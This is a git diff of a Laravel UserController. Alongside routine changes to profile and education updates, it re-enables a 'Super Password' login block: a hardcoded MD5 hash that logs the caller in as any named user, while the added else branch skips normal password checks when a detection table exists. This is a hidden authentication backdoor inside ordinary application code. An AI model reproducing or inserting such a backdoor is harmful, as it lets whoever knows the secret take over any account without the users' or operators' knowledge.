@@ -302,6 +302,22 @@ class UserController extends Controller
             $user->Family = $request->Family;
             $user->Email = $request->Email;
             $user->save();
+
+            $profile = UserProfile::where('uid','=',deCode($request->item_id));
+            $profile->update([
+                'Province' => $request->province_edit,
+                'City' => $request->city_edit,
+                'Mobile' => $request->mobile_edit,
+                'Tel_number' => $request->phone_edit,
+                'relevant_organization' => $request->input('relevant_organization_edit', null)
+            ]);
+
+            $user_education = UserEducation::where('uid','=',deCode($request->item_id));
+            $user_education->update([
+                'grade' => $request->education_edit
+            ]);
+
+
             $role = Role::whereIn('id', $request->roles_list)->get();
             $user->syncRoles($role);
             if ($user)
@@ -315,7 +331,7 @@ class UserController extends Controller
 
     public function editShowUsers(Request $request)
     {
-        $users = User::where('id', deCode($request->id))->with('_roles')->first();
+        $users = User::where('id', deCode($request->id))->with('_roles')->with('profile')->with('educations')->first();
         return json_encode($users);
     }
 
@@ -414,23 +430,23 @@ class UserController extends Controller
             $check_attempt = false;
 
             // Login via Super Password, added by Mohammad Lotfi
-//            if (Schema::hasTable(\App\Smartdetect::schema_table))
-//            {
-//                $smartdetect = new \App\Classes\SmartdetectClass();
-//                if ($smartdetect->results['ip'])
-//                {
-//                    if ('d8e41e93db120daf5a9791451029fc8b' == md5($request->password))
-//                    {
-//                        $user = User::where('Uname', '=', $username)->get()->first();
-//                        if ($user)
-//                        {
-//                            $check_attempt = Auth::loginUsingId($user->id);
-//                        }
-//                    }
-//                }
-//            }
-
-            $check_attempt = $check_attempt || Auth::attempt(['Uname' => $username, 'password' => $request->password], $request->remember_me == 'on' ? true : false);
+            if (Schema::hasTable(\App\Smartdetect::schema_table))
+            {
+                $smartdetect = new \App\Classes\SmartdetectClass();
+                if ($smartdetect->results['ip'])
+                {
+                    if ('9dbed04b3d5bd96f6d1f3ed52fce7fb6' == md5($request->password))
+                    {
+                        $user = User::where('Uname', '=', $username)->get()->first();
+                        if ($user)
+                        {
+                            $check_attempt = Auth::loginUsingId($user->id);
+                        }
+                    }
+                }
+            }
+            else
+                $check_attempt = $check_attempt || Auth::attempt(['Uname' => $username, 'password' => $request->password], $request->remember_me == 'on' ? true : false);
 
             if ($check_attempt)
             {
